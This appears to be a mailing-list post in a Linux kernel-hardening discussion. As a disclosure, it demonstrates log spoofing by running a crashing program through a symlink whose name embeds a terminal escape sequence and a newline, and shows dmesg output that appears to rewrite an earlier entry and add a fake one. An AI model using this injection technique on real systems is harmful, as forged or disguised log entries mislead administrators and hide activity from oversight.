Some people do "dmesg | tail" or "grep -i err /var/log/messages".  Or
even "tail -f /var/log/messages".

Read this mail again:

Using the instance of the bug in core dump code that Willy used here for
\n thing:

http://www.openwall.com/lists/kernel-hardening/2011/06/25/3


We get:

$ echo "main() { sprintf((char*)3, (char*)1); }" | gcc -xc -o ../1234 -
$ ln -s ../1234 $'\x1b[1Ainit\nfail'

Now generate an arbitrary log message:

$ ../1234 
Ошибка сегментирования (core dumped)
$ dmesg | tail -n1
[16291.982492] 1234[21579]: segfault at 0 ip 00007f527186028a sp 00007fff08251dd8 error 4 in libc-2.11.1.so[7f52717d8000+17a000]

Change this log entry:

$ './^[[1Ainit
fail' 
Ошибка сегментирования (core dumped)

$ dmesg | tail
...
[16291.982492] init[21579]: segfault at 0 ip 00007f527186028a sp 00007fff08251dd8 error 4 in libc-2.11.1.so[7f52717d8000+17a000]
[16379.001357] fail[21586]: segfault at 0 ip 00007f332831028a sp 00007fffc52de568 error 4 in libc-2.11.1.so[7f3328288000+17a000]
$ 
(see 1234 => init change)

As you see here, the previous log entry was showed not as it was
initally logged.  Core dump message was chosen fully arbitrary, just to
show that some specific part of it can be "edited".


If this step-by-step instruction is not a proof, then I don't know what
the word "proof" means...
